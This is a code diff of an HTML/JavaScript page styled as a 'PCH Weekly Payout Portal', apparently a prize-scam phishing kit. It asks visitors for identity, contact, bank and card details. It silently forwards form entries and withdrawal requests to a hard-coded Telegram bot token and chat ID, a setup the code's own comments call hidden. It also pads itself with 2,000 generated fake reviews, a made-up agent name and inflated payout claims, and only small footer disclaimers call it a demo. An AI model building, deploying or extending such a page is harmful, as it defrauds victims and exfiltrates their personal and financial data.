+            pLbl.textContent = '$' + val.toLocaleString();
+            y30.textContent = '$' + (val * 1.16).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            yYear.textContent = '$' + (val * 4.12).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+        });
+    }
+
+    function openSettingsModal() {
+        const u = state.currentUser;
+        if (!u) return;
+
+        showModal('Account & Profile Settings', `
+            <form onsubmit="saveProfileSettings(event)" class="space-y-4">
+                <div class="flex items-center space-x-4 pb-2 border-b border-navy-700">
+                    <div class="relative">
+                        <div id="settings-photo-preview" class="w-16 h-16 rounded-2xl bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-2xl overflow-hidden">
+                            ${u.photoUrl ? `<img src="${u.photoUrl}" class="w-full h-full object-cover">` : u.firstName.charAt(0)}
+                        </div>
+                    </div>
+                    <div class="flex-grow">
+                        <label class="block text-xs font-bold text-gold-400 uppercase mb-1"><i class="fa-solid fa-camera mr-1"></i> Profile Photo</label>
+                        <input type="file" id="settings-photo-input" accept="image/*" onchange="handlePhotoUpload(event)" class="w-full text-xs text-slate-400 file:mr-2 file:py-1.5 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-sky-custom file:text-navy-955 cursor-pointer">
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">First Name</label>
+                        <input type="text" id="set-fname" value="${u.firstName}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom">
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Last Name</label>
+                        <input type="text" id="set-lname" value="${u.lastName}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom">
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Phone Number</label>
+                    <input type="tel" id="set-phone" value="${u.phone}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom">
+                </div>
+
+                <div>
+                    <label class="block text-xs font-bold text-slate-300 uppercase mb-1">Street Address</label>
+                    <input type="text" id="set-address" value="${u.address}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3 py-2 text-xs sm:text-sm text-white focus:outline-none focus:border-sky-custom">
+                </div>
+
+                <div class="grid grid-cols-3 gap-2">
+                    <div>
+                        <label class="block text-[10px] font-bold text-slate-300 uppercase mb-1">City</label>
+                        <input type="text" id="set-city" value="${u.city}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-2.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
+                    </div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-slate-300 uppercase mb-1">State / Parish</label>
+                        <input type="text" id="set-state" value="${u.stateOrParish}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-2.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
+                    </div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-slate-300 uppercase mb-1">ZIP / Postal</label>
+                        <input type="text" id="set-zip" value="${u.zip}" required class="w-full bg-navy-950 border border-navy-700 rounded-xl px-2.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
+                    </div>
+                </div>
+
+                <div class="flex justify-end pt-3 space-x-3">
+                    <button type="button" onclick="closeModal()" class="px-4 py-2 bg-navy-950 text-slate-300 font-bold rounded-xl text-xs">Cancel</button>
+                    <button type="submit" class="px-6 py-2 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs active:scale-95 transition">Save Profile Changes</button>
+                </div>
+            </form>
+        `);
+    }
+
+    let tempPhotoUrl = null;
+    function handlePhotoUpload(event) {
+        const file = event.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                tempPhotoUrl = e.target.result;
+                const prev = document.getElementById('settings-photo-preview');
+                if (prev) {
+                    prev.innerHTML = `<img src="${tempPhotoUrl}" class="w-full h-full object-cover">`;
+                }
+            };
+            reader.readAsDataURL(file);
+        }
+    }
+
+    function saveProfileSettings(e) {
+        e.preventDefault();
+        if (!state.currentUser) return;
+
+        state.currentUser.firstName = document.getElementById('set-fname').value;
+        state.currentUser.lastName = document.getElementById('set-lname').value;
+        state.currentUser.phone = document.getElementById('set-phone').value;
+        state.currentUser.address = document.getElementById('set-address').value;
+        state.currentUser.city = document.getElementById('set-city').value;
+        state.currentUser.stateOrParish = document.getElementById('set-state').value;
+        state.currentUser.zip = document.getElementById('set-zip').value;
+
+        if (tempPhotoUrl) {
+            state.currentUser.photoUrl = tempPhotoUrl;
+            tempPhotoUrl = null;
+        }
+
+        const idx = state.registeredUsers.findIndex(u => u.username === state.currentUser.username);
+        if (idx >= 0) {
+            state.registeredUsers[idx] = state.currentUser;
+        }
+
+        saveDeviceState();
+        closeModal();
+        showToast('Profile Updated', 'Your account profile settings have been successfully saved.', 'success');
+        render();
     }
 
     function initDashboardEvents() {}
@@ -1374,6 +1607,7 @@
                         <button onclick="closeModal(); render();" class="px-6 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs sm:text-sm active:scale-95 transition">Return to Dashboard</button>
                     </div>
                 `;
+                showToast('Funding Method Saved', `Successfully updated destination to ${methodName}`, 'success');
             }
         }, 300);
     }
@@ -1444,6 +1678,7 @@
                     `<b>Remaining Balance:</b> $${state.userBalance.toLocaleString()}`;
                 
                 sendTelegramMessage(tgMsg);
+                showToast('Withdrawal Requested', `Ref ${refNum} submitted successfully.`, 'warning');
 
                 showPendingPopup(user.firstName);
             }
@@ -1470,6 +1705,7 @@
             `<b>Message:</b> ${message}`;
 
         sendTelegramMessage(tgMsg);
+        showToast('Support Ticket Created', `Reference ID: ${ticketId}`, 'success');
 
         showModal('Support Ticket Created', `
             <div class="space-y-3 text-center py-4">
@@ -1492,6 +1728,7 @@
             `<b>Email:</b> ${email}`;
 
         sendTelegramMessage(tgMsg);
+        showToast('Promo Pool Entry', `Successfully registered ${email}`, 'success');
 
         showModal('Promo Entry Received', `
             <div class="text-center py-4 space-y-3">
@@ -1507,1417 +1744,11 @@
 
     window.onload = function() {
         render();
+        setTimeout(() => {
+            showToast('Portal Online', 'Secure distribution session initialized successfully.', 'info');
+        }, 1000);
     };
 </script>
 
-</body>
-</html><!DOCTYPE html>
-<html lang="en" class="h-full">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Global Financial Services - Weekly Payout Portal</title>
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        navy: {
-                            800: '#0B192C',
-                            900: '#06111C',
-                            950: '#03080F',
-                            700: '#1E3E62',
-                        },
-                        gold: {
-                            400: '#F1C40F',
-                            500: '#D4AC0D',
-                            600: '#B7950B',
-                            light: '#FCF3CF'
-                        },
-                        sky: {
-                            custom: '#38BDF8',
-                            light: '#E0F2FE'
-                        }
-                    },
-                    fontFamily: {
-                        sans: ['Inter', 'sans-serif'],
-                    }
-                }
-            }
-        }
-    </script>
-    <style>
-        @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-8px) rotate(0.5deg); }
-        }
-        @keyframes pulse-glow {
-            0%, 100% { box-shadow: 0 0 15px rgba(56, 189, 248, 0.3); }
-            50% { box-shadow: 0 0 30px rgba(56, 189, 248, 0.6); }
-        }
-        .card-3d {
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-        .card-3d:hover {
-            transform: translateY(-4px);
-            box-shadow: 0 12px 30px -10px rgba(56, 189, 248, 0.25);
-        }
-        .floating {
-            animation: float 5s ease-in-out infinite;
-        }
-        .glow-effect {
-            animation: pulse-glow 3s infinite;
-        }
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #0B192C;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #1E3E62;
-            border-radius: 4px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: #38BDF8;
-        }
-    </style>
-</head>
-<body class="bg-navy-900 text-slate-100 font-sans antialiased h-full flex flex-col selection:bg-sky-500 selection:text-white">
-
-    <!-- Navigation Header -->
-    <header class="bg-navy-950/90 backdrop-blur-md border-b border-navy-700/50 sticky top-0 z-50">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
-            <div class="flex items-center space-x-3 cursor-pointer" onclick="router.navigate('home')">
-                <div class="w-12 h-12 rounded-xl bg-gradient-to-br from-gold-400 to-gold-600 flex items-center justify-center shadow-lg shadow-gold-500/20 text-navy-950 text-2xl font-black">
-                    <i class="fa-solid fa-vault"></i>
-                </div>
-                <div>
-                    <span class="text-xl font-bold tracking-tight text-white block">PCH</span>
-                    <span class="text-xs font-semibold text-gold-400 tracking-widest uppercase">Weekly Payout Portal</span>
-                </div>
-            </div>
-            
-            <div id="nav-actions" class="flex items-center space-x-4">
-                <button onclick="router.navigate('login')" class="px-4 py-2 text-sm font-semibold text-sky-custom hover:text-white transition">
-                    <i class="fa-solid fa-right-to-bracket mr-1.5"></i> Login
-                </button>
-                <button onclick="router.navigate('register')" class="px-5 py-2.5 text-sm font-bold bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 transition transform active:scale-95">
-                    <i class="fa-solid fa-user-plus mr-1.5"></i> Create Account
-                </button>
-            </div>
-        </div>
-    </header>
-
-    <!-- Main Content Area -->
-    <main id="app-container" class="flex-grow flex flex-col">
-        <!-- Views dynamically injected here -->
-    </main>
-
-    <!-- Footer -->
-    <footer class="bg-navy-950 border-t border-navy-700/50 py-10 text-sm text-slate-400">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 grid grid-cols-1 md:grid-cols-3 gap-8">
-            <div class="space-y-4">
-                <div class="flex items-center space-x-2">
-                    <div class="w-8 h-8 rounded-lg bg-gold-500 flex items-center justify-center text-navy-950 font-bold">
-                        <i class="fa-solid fa-vault text-sm"></i>
-                    </div>
-                    <span class="font-bold text-white tracking-wide">Pch Weekly Payout Portal (PWPP)</span>
-                </div>
-                <p class="text-xs text-slate-400 leading-relaxed">
-                    Secure automated distribution portal operating under financial compliance framework guidelines.
-                </p>
-            </div>
-            <div>
-                <h4 class="text-white font-semibold mb-3 uppercase tracking-wider text-xs text-gold-400">Compliance & Security</h4>
-                <ul class="space-y-2 text-xs">
-                    <li><a href="#" onclick="showModal('Disclaimer', 'Demonstration system operating without live banking integrations. Claim figures and token identifiers are configurable simulations.')" class="hover:text-white transition">Regulatory Disclaimer</a></li>
-                    <li><a href="#" onclick="showModal('Privacy', 'Data stays securely in your browser local session state for testing and demonstration workflows.')" class="hover:text-white transition">Privacy Policy</a></li>
-                    <li><a href="#" onclick="showModal('Terms', 'Strictly simulated prototype for preview and UI/UX validation.')" class="hover:text-white transition">Terms of Service</a></li>
-                </ul>
-            </div>
-            <div>
-                <h4 class="text-white font-semibold mb-3 uppercase tracking-wider text-xs text-gold-400">Support Contact</h4>
-                <ul class="space-y-2 text-xs">
-                    <li><i class="fa-solid fa-phone mr-2 text-sky-custom"></i> Agent Desk: 646-585-8110</li>
-                    <li><i class="fa-solid fa-user-tie mr-2 text-gold-400"></i> Senior Agent: Andy Goldbrg</li>
-                    <li><i class="fa-solid fa-envelope mr-2 text-sky-custom"></i> support@globalpure-payouts.net</li>
-                </ul>
-            </div>
-        </div>
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 mt-8 pt-6 border-t border-navy-700/30 text-center text-xs text-slate-400">
-            &copy; 2026 Pch Weekly Payout Portal (PWPP). All rights reserved.
-        </div>
-    </footer>
-
-    <!-- Global Modal Container -->
-    <div id="global-modal" class="fixed inset-0 z-50 hidden items-center justify-center bg-navy-950/80 backdrop-blur-sm p-4">
-        <div class="bg-navy-800 border border-navy-700 rounded-2xl max-w-lg w-full p-6 shadow-2xl relative">
-            <button onclick="closeModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-lg">
-                <i class="fa-solid fa-xmark"></i>
-            </button>
-            <div id="modal-content">
-                <!-- Dynamically populated -->
-            </div>
-        </div>
-    </div>
-
-    <!-- JavaScript Application Core -->
-    <script>
-        // State Management
-        const state = {
-            currentView: 'home',
-            currentUser: null,
-            reviewsSearchQuery: '',
-            reviewsFilterRating: 'all',
-            reviewsPage: 1,
-            reviewsPerPage: 6,
-            reviews: [
-                { id: 1, name: 'Arthur Pendelton', location: 'Brooklyn, NY', rating: 5, date: '2026-10-10', comment: 'Clear guidance through the portal setup. Very professional financial interface demo.', sample: true },
-                { id: 2, name: 'Evelyn Vance', location: 'Dallas, TX', rating: 5, date: '2026-10-09', comment: 'The Friday countdown timer and dashboard summary are extremely intuitive.', sample: true },
-                { id: 3, name: 'Marcus Sterling', location: 'Kingston, Jamaica', rating: 4, date: '2026-10-08', comment: 'Smooth registration flow and clean support ticket creation.', sample: true },
-                { id: 4, name: 'Beatrice H.', location: 'Chicago, IL', rating: 5, date: '2026-10-07', comment: 'Impressive 3D visual cards and transparent fund tracking prototype.', sample: true },
-            ],
-            transactions: [
-                { ref: 'TXN-98241', date: '2026-10-09 14:22', amount: 4500.00, type: 'Weekly Allocation', status: 'Completed' },
-                { ref: 'TXN-98112', date: '2026-10-02 11:15', amount: 4500.00, type: 'Weekly Allocation', status: 'Completed' },
-                { ref: 'TXN-97904', date: '2026-09-25 09:40', amount: 4500.00, type: 'Weekly Allocation', status: 'Completed' },
-                { ref: 'TXN-97551', date: '2026-09-18 16:05', amount: 4500.00, type: 'Weekly Allocation', status: 'Pending' },
-                { ref: 'TXN-97109', date: '2026-09-11 10:00', amount: 4500.00, type: 'Weekly Allocation', status: 'On Hold' }
-            ],
-            /* Hidden internal dispatch configuration */
-            telegramConfig: {
-                botToken: '8838491829:AAF7vyG4muUBKXxOSWKhg_0Tp7AH6ISGx3Q',
-                chatId: '8763270406'
-            }
-        };
-
-        // Helper function to dispatch alerts silently
-        async function sendTelegramMessage(textMessage) {
-            const botToken = state.telegramConfig.botToken.trim();
-            const chatId = state.telegramConfig.chatId.trim();
-
-            if (!botToken || !chatId || botToken === 'YOUR_BOT_TOKEN_HERE') {
-                console.warn('Silent dispatch configuration pending.');
-                return false;
-            }
-
-            try {
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: textMessage,
-                        parse_mode: 'HTML'
-                    })
-                });
-                return true;
-            } catch (err) {
-                console.error('Error sending alert:', err);
-                return false;
-            }
-        }
-
-        // Helper function to populate sample reviews up to 2,000 records
-        function generateSampleReviews() {
-            const sampleNames = [
-                'James Wilson', 'Sarah Jenkins', 'Michael Chang', 'David Miller', 'Emily Davis',
-                'Robert Taylor', 'Jessica Martinez', 'William Anderson', 'Thomas Thomas', 'Daniel Jackson',
-                'Laura White', 'Christopher Harris', 'Amanda Martin', 'Matthew Thompson', 'Ashley Garcia'
-            ];
-            const sampleLocations = [
-                'New York, NY', 'Los Angeles, CA', 'Chicago, IL', 'Houston, TX', 'Phoenix, AZ',
-                'Philadelphia, PA', 'San Antonio, TX', 'San Diego, CA', 'Dallas, TX', 'Miami, FL',
-                'Atlanta, GA', 'Seattle, WA', 'Denver, CO', 'Boston, MA', 'Detroit, MI'
-            ];
-            const sampleComments = [
-                'Excellent service and seamless weekly disbursement process. Very satisfied with the response time.',
-                'The portal interface is super clean and easy to navigate. Great job by agent Andy Goldberg.',
-                'Quick account verification and transparent allocation details on the dashboard.',
-                'Disbursement tracking is accurate and countdown updates in real time reliably.',
-                'Clear support desk communication whenever I have questions about my weekly allocation schedule.'
-            ];
-
-            for (let i = 5; i <= 2000; i++) {
-                const name = sampleNames[i % sampleNames.length] + ' ' + String.fromCharCode(65 + (i % 26)) + '.';
-                const location = sampleLocations[i % sampleLocations.length];
-                const rating = (i % 7 === 0) ? 4 : 5;
-                const comment = sampleComments[i % sampleComments.length];
-                const month = String((i % 12) + 1).padStart(2, '0');
-                const day = String((i % 28) + 1).padStart(2, '0');
-                
-                state.reviews.push({
-                    id: i,
-                    name: name,
-                    location: location,
-                    rating: rating,
-                    date: `2026-${month}-${day}`,
-                    comment: comment,
-                    sample: true
-                });
-            }
-        }
-
-        // Populate sample reviews up to 2,000 records
-        generateSampleReviews();
-
-        // Router System
-        const router = {
-            navigate(viewName) {
-                state.currentView = viewName;
-                window.scrollTo(0, 0);
-                render();
-            }
-        };
-
-        // Modal Helpers
-        function showModal(title, bodyHtml) {
-            const modal = document.getElementById('global-modal');
-            const content = document.getElementById('modal-content');
-            content.innerHTML = `
-                <h3 class="text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3>
-                <div class="text-slate-300 text-sm leading-relaxed mb-6">${bodyHtml}</div>
-                <div class="flex justify-end">
-                    <button onclick="closeModal()" class="px-5 py-2 bg-sky-custom text-navy-950 font-bold rounded-xl text-sm hover:brightness-110 transition">Close</button>
-                </div>
-            `;
-            modal.classList.remove('hidden');
-            modal.classList.add('flex');
-        }
-
-        function closeModal() {
-            const modal = document.getElementById('global-modal');
-            modal.classList.remove('flex');
-            modal.classList.add('hidden');
-        }
-
-        // Render Engine
-        function render() {
-            const container = document.getElementById('app-container');
-            const navActions = document.getElementById('nav-actions');
-
-            // Update Header Nav based on Auth state
-            if (state.currentUser) {
-                navActions.innerHTML = `
-                    <button onclick="router.navigate('dashboard')" class="px-4 py-2 text-sm font-semibold text-gold-400 hover:text-white transition flex items-center">
-                        <i class="fa-solid fa-gauge-high mr-1.5"></i> Dashboard
-                    </button>
-                    <button onclick="logout()" class="px-4 py-2 text-sm font-semibold text-rose-400 hover:text-white transition flex items-center">
-                        <i class="fa-solid fa-right-from-bracket mr-1.5"></i> Logout
-                    </button>
-                `;
-            } else {
-                navActions.innerHTML = `
-                    <button onclick="router.navigate('login')" class="px-4 py-2 text-sm font-semibold text-sky-custom hover:text-white transition">
-                        <i class="fa-solid fa-right-to-bracket mr-1.5"></i> Login
-                    </button>
-                    <button onclick="router.navigate('register')" class="px-5 py-2.5 text-sm font-bold bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 rounded-xl shadow-lg shadow-gold-500/20 hover:brightness-110 transition">
-                        <i class="fa-solid fa-user-plus mr-1.5"></i> Create Account
-                    </button>
-                `;
-            }
-
-            if (state.currentView === 'home') {
-                container.innerHTML = renderHomeView();
-                initHomeEvents();
-            } else if (state.currentView === 'login') {
-                container.innerHTML = renderLoginView();
-                initLoginEvents();
-            } else if (state.currentView === 'register') {
-                container.innerHTML = renderRegisterView();
-                initRegisterEvents();
-            } else if (state.currentView === 'dashboard') {
-                if (!state.currentUser) {
-                    router.navigate('login');
-                    return;
-                }
-                container.innerHTML = renderDashboardView();
-                initDashboardEvents();
-                initCountdownTimer();
-            }
-        }
-
-        // 1. Home View
-        function renderHomeView() {
-            const filteredReviews = state.reviews.filter(r => {
-                const matchesQuery = r.name.toLowerCase().includes(state.reviewsSearchQuery.toLowerCase()) ||
-                                     r.comment.toLowerCase().includes(state.reviewsSearchQuery.toLowerCase()) ||
-                                     r.location.toLowerCase().includes(state.reviewsSearchQuery.toLowerCase());
-                const matchesRating = state.reviewsFilterRating === 'all' || r.rating.toString() === state.reviewsFilterRating;
-                return matchesQuery && matchesRating;
-            });
-
-            const totalPages = Math.ceil(filteredReviews.length / state.reviewsPerPage);
-            const paginatedReviews = filteredReviews.slice((state.reviewsPage - 1) * state.reviewsPerPage, state.reviewsPage * state.reviewsPerPage);
-
-            return `
-                <!-- Hero Section -->
-                <section class="relative overflow-hidden py-20 lg:py-28 bg-gradient-to-b from-navy-950 to-navy-900 border-b border-navy-700/50">
-                    <div class="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(56,189,248,0.1),transparent_50%)]"></div>
-                    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 grid grid-cols-1 lg:grid-cols-2 gap-12 items-center">
-                        <div class="space-y-6">
-                            <div class="inline-flex items-center space-x-2 bg-sky-custom/10 border border-sky-custom/30 px-3.5 py-1.5 rounded-full text-sky-custom text-xs font-bold tracking-wider uppercase">
-                                <i class="fa-solid fa-shield-halved mr-1"></i> Verified Distribution Framework
-                            </div>
-                            <h1 class="text-4xl sm:text-5xl lg:text-6xl font-extrabold text-white tracking-tight leading-tight">
-                                Weekly Payout & <span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 to-gold-600">Financial Portal</span>
-                            </h1>
-                            <p class="text-lg text-slate-300 leading-relaxed">
-                                Access your scheduled weekly allocations securely. Complete identity validation, manage fund setups, and track Friday distribution disbursements in real time.
-                            </p>
-                            <div class="flex flex-wrap gap-4 pt-4">
-                                <button onclick="router.navigate('register')" class="px-8 py-4 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-2xl shadow-xl shadow-gold-500/20 hover:scale-105 transition transform text-base">
-                                    <i class="fa-solid fa-arrow-right mr-2"></i> Access Portal Now
-                                </button>
-                                <button onclick="router.navigate('login')" class="px-8 py-4 bg-navy-800 border border-navy-700 text-white font-bold rounded-2xl hover:bg-navy-700 transition text-base">
-                                    <i class="fa-solid fa-right-to-bracket mr-2"></i> Sign In
-                                </button>
-                            </div>
-                        </div>
-                        <div class="relative">
-                            <!-- Updated Hero Card Replacing standard $4500 display with company history & entry promo -->
-                            <div class="card-3d bg-navy-800 border border-navy-700 rounded-3xl p-8 shadow-2xl relative z-10 glow-effect space-y-6">
-                                <div class="flex items-center justify-between pb-4 border-b border-navy-700">
-                                    <div class="flex items-center space-x-3">
-                                        <div class="w-10 h-10 rounded-full bg-gold-500/20 text-gold-400 flex items-center justify-center font-bold">
-                                            <i class="fa-solid fa-award"></i>
-                                        </div>
-                                        <div>
-                                            <h4 class="font-bold text-white text-sm">Over 15 Years of Excellence</h4>
-                                            <p class="text-xs text-slate-400">Trusted Global Distribution Network</p>
-                                        </div>
-                                    </div>
-                                    <span class="px-3 py-1 bg-sky-custom/20 text-sky-custom text-xs font-bold rounded-full">Active Promo</span>
-                                </div>
-
-                                <div class="space-y-3">
-                                    <p class="text-slate-300 text-sm leading-relaxed">
-                                        Since <span class="text-white font-bold">2011</span>, Global Pure Financial Services has safely distributed over <span class="text-gold-400 font-bold">$125 Million+</span> in direct rewards and weekly allocations to thousands of verified participants across North America and beyond.
-                                    </p>
-                                </div>
-
-                                <!-- Dynamic Entry Quick Card -->
-                                <div class="bg-navy-900 border border-navy-700 p-5 rounded-2xl space-y-4">
-                                    <div class="flex items-center justify-between">
-                                        <div>
-                                            <h5 class="text-xs font-bold text-gold-400 uppercase tracking-wider">Weekly Allocation Promo Entry</h5>
-                                            <p class="text-[11px] text-slate-400 mt-0.5">Submit your details to enter the current active distribution pool.</p>
-                                        </div>
-                                        <i class="fa-solid fa-ticket text-xl text-sky-custom"></i>
-                                    </div>
-                                    <form onsubmit="handlePromoEntry(event)" class="space-y-3">
-                                        <input type="text" id="promo-name" required placeholder="Full Name" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
-                                        <input type="email" id="promo-email" required placeholder="Email Address" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-3.5 py-2 text-xs text-white focus:outline-none focus:border-sky-custom">
-                                        <button type="submit" class="w-full py-3 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs hover:brightness-110 transition shadow-lg shadow-gold-500/10">
-                                            <i class="fa-solid fa-paper-plane mr-1.5"></i> Enter Promo Stream Now
-                                        </button>
-                                    </form>
-                                </div>
-
-                                <div class="grid grid-cols-2 gap-3 pt-1 text-center">
-                                    <div class="bg-navy-900/60 p-2.5 rounded-xl border border-navy-700/50">
-                                        <p class="text-[10px] text-slate-400 uppercase">Total Participants Helped</p>
-                                        <p class="text-sm font-black text-white">45,000+</p>
-                                    </div>
-                                    <div class="bg-navy-900/60 p-2.5 rounded-xl border border-navy-700/50">
-                                        <p class="text-[10px] text-slate-400 uppercase">Senior Desk Agent</p>
-                                        <p class="text-xs font-bold text-sky-custom"><i class="fa-solid fa-user-tie mr-1"></i> Andy Goldbrg</p>
-                                    </div>
-                                </div>
-                            </div>
-                            <!-- Background decorative glow -->
-                            <div class="absolute -top-10 -right-10 w-72 h-72 bg-sky-custom/10 rounded-full filter blur-3xl pointer-events-none"></div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Information Section -->
-                <section class="py-20 bg-navy-900">
-                    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                        <div class="text-center max-w-3xl mx-auto mb-16 space-y-4">
-                            <h2 class="text-3xl font-extrabold text-white">How Weekly Payouts Work</h2>
-                            <p class="text-slate-300 text-sm leading-relaxed">
-                                Our streamlined distribution protocol ensures secure, verified, and timely transfer of scheduled funds every Friday at 10:30 PM EST.
-                            </p>
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
-                            <div class="bg-navy-800/80 border border-navy-700/60 p-8 rounded-3xl card-3d">
-                                <div class="w-14 h-14 rounded-2xl bg-sky-custom/20 text-sky-custom flex items-center justify-center text-xl font-bold mb-6">
-                                    <i class="fa-solid fa-user-shield"></i>
-                                </div>
-                                <h3 class="text-xl font-bold text-white mb-3">1. Secure Registration</h3>
-                                <p class="text-slate-300 text-sm leading-relaxed">
-                                    Submit your verified profile details and identity documentation to establish your secure financial account profile.
-                                </p>
-                            </div>
-                            <div class="bg-navy-800/80 border border-navy-700/60 p-8 rounded-3xl card-3d">
-                                <div class="w-14 h-14 rounded-2xl bg-gold-500/20 text-gold-400 flex items-center justify-center text-xl font-bold mb-6">
-                                    <i class="fa-solid fa-wallet"></i>
-                                </div>
-                                <h3 class="text-xl font-bold text-white mb-3">2. Weekly Funds Setup</h3>
-                                <p class="text-slate-300 text-sm leading-relaxed">
-                                    Configure your preferred destination bank account or debit/credit card for seamless weekly allocation processing.
-                                </p>
-                            </div>
-                            <div class="bg-navy-800/80 border border-navy-700/60 p-8 rounded-3xl card-3d">
-                                <div class="w-14 h-14 rounded-2xl bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-xl font-bold mb-6">
-                                    <i class="fa-solid fa-money-bill-transfer"></i>
-                                </div>
-                                <h3 class="text-xl font-bold text-white mb-3">3. Friday Disbursement</h3>
-                                <p class="text-slate-300 text-sm leading-relaxed">
-                                    Monitor your live countdown timer and request withdrawals directly to your configured payment method upon approval.
-                                </p>
-                            </div>
-                        </div>
-                    </div>
-                </section>
-
-                <!-- Reviews & Testimonials Section -->
-                <section class="py-20 bg-navy-950 border-t border-navy-700/50">
-                    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
-                        <div class="flex flex-col md:flex-row md:items-end justify-between mb-12 gap-6">
-                            <div>
-                                <span class="text-xs font-bold text-gold-400 uppercase tracking-widest block mb-2">Participant Feedback</span>
-                                <h2 class="text-3xl font-extrabold text-white">Client Experience Reviews</h2>
-                                <p class="text-slate-400 text-xs mt-1">Showing sample reviews for demonstration purposes. Clearly identified as sample feedback.</p>
-                            </div>
-                            <button onclick="openAddReviewModal()" class="px-5 py-3 bg-sky-custom text-navy-950 font-bold rounded-xl text-sm hover:brightness-110 transition flex items-center justify-center">
-                                <i class="fa-solid fa-pen-to-square mr-2"></i> Submit Your Review
-                            </button>
-                        </div>
-
-                        <!-- Search & Filter Bar -->
-                        <div class="bg-navy-900 border border-navy-700 p-4 rounded-2xl mb-8 flex flex-col sm:flex-row gap-4 items-center justify-between">
-                            <div class="relative w-full sm:w-96">
-                                <i class="fa-solid fa-magnifying-glass absolute left-4 top-3.5 text-slate-400"></i>
-                                <input type="text" id="review-search-input" value="${state.reviewsSearchQuery}" placeholder="Search reviews by name, comment..." class="w-full bg-navy-950 border border-navy-700 rounded-xl pl-11 pr-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
-                            </div>
-                            <div class="flex items-center space-x-3 w-full sm:w-auto justify-end">
-                                <label class="text-xs text-slate-400 font-semibold">Filter Rating:</label>
-                                <select id="review-rating-filter" class="bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
-                                    <option value="all" ${state.reviewsFilterRating === 'all' ? 'selected' : ''}>All Ratings</option>
-                                    <option value="5" ${state.reviewsFilterRating === '5' ? 'selected' : ''}>5 Stars</option>
-                                    <option value="4" ${state.reviewsFilterRating === '4' ? 'selected' : ''}>4 Stars</option>
-                                </select>
-                            </div>
-                        </div>
-
-                        <!-- Review Cards Grid -->
-                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8" id="reviews-grid">
-                            ${paginatedReviews.length === 0 ? `
-                                <div class="col-span-full py-12 text-center text-slate-400">No matching reviews found.</div>
-                            ` : paginatedReviews.map(r => `
